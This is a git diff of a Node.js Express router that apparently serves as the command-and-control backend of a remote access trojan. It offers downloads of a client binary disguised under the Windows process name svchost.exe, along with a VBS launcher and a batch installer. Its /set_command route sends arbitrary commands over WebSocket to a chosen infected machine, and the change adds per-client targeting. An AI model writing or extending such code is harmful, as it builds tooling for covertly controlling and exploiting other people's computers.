@@ -1,7 +1,15 @@
 const express = require("express");
+const WebSocket = require("ws");  // necessário para readyState etc
 const path = require("path");
 const router = express.Router();
-const WebSocket = require("ws"); // Importante para verificação OPEN
+
+let knownClients;  // variável que receberá o mapa do main.js
+
+function setKnownClients(map) {
+  knownClients = map;
+}
+
+// outras variáveis globais e funções (waitingResolvers, currentCommand, etc)
 
 let waitingResolvers = [];
 let currentCommand = "";
@@ -34,43 +42,59 @@ function handleResult(result) {
   commandId = "";
 }
 
+// rota para downloads (mantida igual)
+
 router.get("/dist/:arquivo", (req, res) => {
   let filePath;
 
   switch (req.params.arquivo) {
     case "hihat":
       filePath = path.resolve(__dirname, "../client/svchost.exe");
-      return res.download(filePath, "hihat.exe");
+      res.download(filePath, "hihat.exe");
+      return;
 
     case "launcher":
       filePath = path.resolve(__dirname, "../client/launcher.vbs");
-      return res.download(filePath, "launcher.vbs");
+      res.download(filePath, "launcher.vbs");
+      return;
 
     case "install":
       filePath = path.resolve(__dirname, "../client/install.bat");
-      return res.download(filePath, "install.bat");
+      res.download(filePath, "install.bat");
+      return;
 
     default:
       return res.status(404).send("Arquivo não encontrado");
   }
 });
 
+// Rota modificada para aceitar clientId e enviar comando para o cliente correto
 router.post("/set_command", async (req, res) => {
-  const { command } = req.body;
-  console.log("[set_command] Recebido:", command);
+  const { command, clientId } = req.body;
+  console.log("[set_command] Recebido:", command, "para cliente:", clientId);
 
   if (!command) {
     return res.status(400).json({ error: "Comando não fornecido" });
   }
 
-  if (!lastClient || lastClient.readyState !== 1) {
-    return res.status(400).json({ error: "Nenhum cliente conectado" });
+  if (!clientId) {
+    return res.status(400).json({ error: "ID do cliente não fornecido" });
+  }
+
+  if (!knownClients) {
+    return res.status(500).json({ error: "Mapa de clientes não inicializado" });
+  }
+
+  const targetClient = knownClients.get(clientId);
+
+  if (!targetClient || targetClient.readyState !== WebSocket.OPEN) {
+    return res.status(400).json({ error: "Cliente não conectado ou inválido" });
   }
 
   commandId = Date.now().toString();
   currentCommand = command;
 
-  lastClient.send(JSON.stringify({ id: commandId, command }));
+  targetClient.send(JSON.stringify({ id: commandId, command }));
 
   try {
     const result = await new Promise((resolve, reject) => {
@@ -94,5 +118,6 @@ module.exports = {
   router,
   setLastClient,
   handleResult,
-  notifyNewComputer
+  notifyNewComputer,
+  setKnownClients
 };
